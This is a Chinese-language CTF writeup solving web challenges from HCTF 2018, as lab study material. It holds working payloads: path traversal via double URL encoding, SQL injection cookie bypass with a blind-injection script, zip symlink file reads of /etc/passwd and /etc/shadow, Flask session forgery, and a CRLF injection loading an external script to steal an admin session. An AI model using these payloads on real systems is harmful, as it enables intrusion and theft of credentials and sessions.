---
title: hctf2018-web writeup
date: 2018-11-12 11:53:48
tags:
	- writeup
	- hctf
---

# 前言

去年参加hctf的时候还是个小萌新，正好这个周末没什么事情参加了一下htcf的十周年纪念版，题目质量很高哈

和队友一起有幸做出了几道web题，记录并学习一下。（web狗只会做web。。。

# Warmup

签到题，题目比较简单

html源码里能看到`source.php`的提示，从而可以获取到源码

```php
<?php
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

一个任意文件读取，但是需要`?`前的字符为`source.php`或者`hint.php`

常规方式应该是无法利用的，但是这里很刻意的写了个`$_page = urldecode($page);`，所以传参的时候只要两次url_encode就可以任意文件读取了

最后payload

```
http://warmup.2018.hctf.io/index.php?file=hint.php%253F/../../../../ffffllllaaaagggg 
```

![](hctf2018-web-writeup\1.png)

# kzone

一个钓鱼网站，一进去就跳转，就只好扫一波目录

![](hctf2018-web-writeup\2.png)

`www.zip`下载下来之后就是网站源码，然后就是一波源码审计

## 代码审计

定位到一个点`include/member.php`

```php
<?php
if (!defined('IN_CRONLITE')) exit();
$islogin = 0;
if (isset($_COOKIE["islogin"])) {
    if ($_COOKIE["login_data"]) {
        $login_data = json_decode($_COOKIE['login_data'], true);
        $admin_user = $login_data['admin_user'];
        $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
        if ($udata['username'] == '') {
            setcookie("islogin", "", time() - 604800);
            setcookie("login_data", "", time() - 604800);
        }
        $admin_pass = sha1($udata['password'] . LOGIN_KEY);
        if ($admin_pass == $login_data['admin_pass']) {
            $islogin = 1;
        } else {
            setcookie("islogin", "", time() - 604800);
            setcookie("login_data", "", time() - 604800);
        }
    }
}
....
```

重点在`$login_data = json_decode($_COOKIE['login_data'], true);`

直接从`$_COOKIE`中取的数据，并且直接拼接到了SQL语句中

```php
$udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
```

在本地搭建好环境后测试一波，我这里直接把SQL语句给die了出来

![](hctf2018-web-writeup\3.png)

出现了一些奇怪的东西，最后定位到`admin/safe.php`中

```php
<?php
function waf($string)
{
    $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';
    return preg_replace_callback($blacklist, function ($match) {
        return '@' . $match[0] . '@';
    }, $string);
}
```

过滤了蛮多的字符，最后找到一个可以登录的payload

```php
islogin=1; 
login_data={"admin_user":"admin'\rand\r'0","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"}
```

此时的sql语句为

```SQL
SELECT * FROM fish_admin WHERE username='admin'\rand\r'0' limit 1
```

这样`$udata`的值就恒为`NULL`，从而cookie中的`admin_pass`就为定值，可以伪造admin登录

![](hctf2018-web-writeup\4.png)

进去之后搜了一波没找到什么有用的东西，最后还是把目光转回了SQL注入中，是否还能注入些更有用的数据呢？

## SQL注入

根据waf找了一个勉强可以注入的语句

```
{"admin_user":"admin'\rand\rlpad(user(),{},2)in('r00t')\rand'1","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"}
```

这时的SQL语句就变为了

```SQL
select * from fish_admin where username='admin' and lpad(`username`,1,1)in('a') and'1' limit 1;
```

就可以通过是否登录成功进行盲注

这时候勉强可以注入出`user()`、`username`这些无关痛痒的信息，但是当想注表名之类的数据时，就会因为`information`中存在`or`而无法注入

最后，组内一个大佬提示了一波unicode编码

> json_decode在解码的时候会进行一次unicode解码

这样问题就好解决了，只要把被过滤的字符进行unicode编码然后传入就可以了，写了一个python脚本

```python
import requests
import string

url = "http://kzone.2018.hctf.io/admin/login.php"

rg = '._- {}'+string.digits+string.ascii_letters+'&'
flag = ''

for l in range(30):
	for i in rg:
		cookies = {
			"islogin":"1",
			# 'login_data': r'''{{"admin_user":"admin'\rand\rlpad((select\rcolumn_name\rfrom\rinf\u006frmation_schema.columns\rwhere\rtable_name\u003d'F1444g'limit\r1),{},2)in('{}{}')\rand'1","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"}}'''.format(l+1,flag, i)
			'login_data': r'''{{"admin_user":"admin'\rand\rlpad((select\rf1a9\rfrom\rF1444g\rlimit\r1),{},2)in('{}{}')\rand'1","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"}}'''.format(l+1,flag, i)	
		}

		r = requests.get(url, cookies=cookies)
		print(i, end="\r")
		# print("\r")
		if len(r.text) > 1000:
			flag+=i
			print(flag)
			break
		if i == '&':
			exit()
```

![](hctf2018-web-writeup\5.png)

# admin

一开始有点懵，不知道做什么，后来在改密码的地方发现了源码泄露（不得不说蛮隐秘。。

```html
<!-- https://github.com/woadsl1234/hctf_flask/ -->
```

下载下来之后，可以在`templates/index.html`中看到

```html
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
```

说明只要session中的name值为admin就可以看到flag

flask中session的一些问题可以看p神的https://www.leavesongs.com/PENETRATION/client-session-security.html

需要伪造session就需要`app.config['SECRET_KEY']`的值一致才可以伪造，这里可以很明显的看到、

config.py

```python
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```

在本地起了环境之后可以发现`os.environ.get('SECRET_KEY')`是不存在的

所以`SECRET_KEY`的值就为固定的`cjk123`

这样，就比较简单了。在本地中删除admin的账户，再注册一个admin既可获取到对应的session

利用这个session放到比赛环境中，就可以成功伪造

```
session=.eJxFkEGLgzAQhf_KMucebIoXoYeFbIsLk6DEyuRSutUao3FBW6op_e8burB7fe_Nx3vzgONlrCcDyXW81Ss4thUkD3j7ggSQaYs875ClkeSml1x0Yp_3cr8zwnez8O-MWN5TiQu5T0PlwQVt0cq0wqYMbbjlKSNPHi1FwlEseO60ShdZprFUlUXbMM2LWdtsIUUxOryTP8daFbEus1mUwkllevR5yOousI1WwghFa_LNXapuRlts4bmC8zRejtfvrh7-J1hj0WcbqZAJv2vJ0QZ5s7xw7NAKFeqWH5F2h1ArzHHZorPtC9e6U1P_kYr9dVD3X2c4uWDAqXLtACu4TfX4-husI3j-AJEPb0Q.W-ecjw.kmDKDiOWm-kN8mitYFL-eVyT2dQ
```

![](hctf2018-web-writeup\11.png)



# hide and seek

## zip软连接

进入之后是一个上传zip的功能，首先想到的就是zip软连接的问题

```
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

生成一个zip文件上传后，也正如预料的，成功读取到了`/etc/passwd`

![](hctf2018-web-writeup\6.png)

但是这貌似才刚刚开始，然后呢，尝试读取了`/flag`、`app/run.py`之类的文件都没有对应的数据返回

但是可以读取`/etc/shadow`，说明权限是`root`

## 一切皆文件

这里卡了蛮久的，然后再网上搜索了一番，利用linux中一切皆文件的性质，尝试读取一些运行状态信息

最后读取了`/proc/self/environ`

![](hctf2018-web-writeup\7.png)

貌似看到了一些有用的信息

```
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
```

尝试读取下这个配置文件，可以获取到文件名

![](hctf2018-web-writeup\8.png)

尝试读取

```
/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
```

就可以读取到源码

## session伪造

```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'

    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)
```

一开始想着直接读取flag，但是被限制了

```python
if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
    return redirect(url_for('index', error=1))
```

解密登录的session可以看到，session中就存放了一个字典

![](hctf2018-web-writeup\9.png)

猜测只要`username`字段等于`admin`就可以看到flag（读取`templates/index.html`也可以验证这一点

 

代码里有一个很诡异的随机数播种`random.seed(uuid.getnode())`

利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的

可以知道`uuid.getnode()`的值是当前MAC地址的十进制形式，则可以通过读取`/sys/class/net/eth0/address`来获取到MAC地址

```
12:34:3e:14:7c:62
```

转换成十进制后为`20015589129314`

然后尝试在本地用python2起了这个服务，一开始怎么试都不行，一开始以为是随机数的问题

后来用python3尝试了下，发现输出的随机数的精度不一样。。。

```
11.935137566861131
```

这样，在`app.config['SECRET_KEY']`一致的时候，session则是可以伪造的，在本地登录个admin账号，然后用session的值放到比赛环境中，就可以看到flag了

![](hctf2018-web-writeup\10.png)





------

赛后复现题

# game

在排序的时候，可以选择用`password`排序

这样，就可以疯狂注册账号，注册不同的密码，根据账号在`admin`的前后位置来fuzz出admin的密码



# bottle

只有几个简单的登录注册，提交url功能。看了wp才知道bottle是个python框架，主要漏洞来自于

https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html

一个2016年的cve漏洞，并且题目也提示了是用的firefox box，在302跳转的`/path`页面中存在一个`CRLF`http头截断

漏洞重点都在p神的文章中提到了，只要将跳转的url小于80即可

```
http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0a%0d%0a<script%20src=//script.kingkk.com/1.js></script>
```

这样提交之后，就可以收到admin的session了，换上session之后，就可以看到flag

![](hctf2018-web-writeup\12.png)















# 最后

由于是陆陆续续做的一些题，做完这些之后比赛就差不多快结束了，后面的题也就是瞟了一眼，有空还是会复现下的。感谢vidar-team一次体验极棒的比赛。





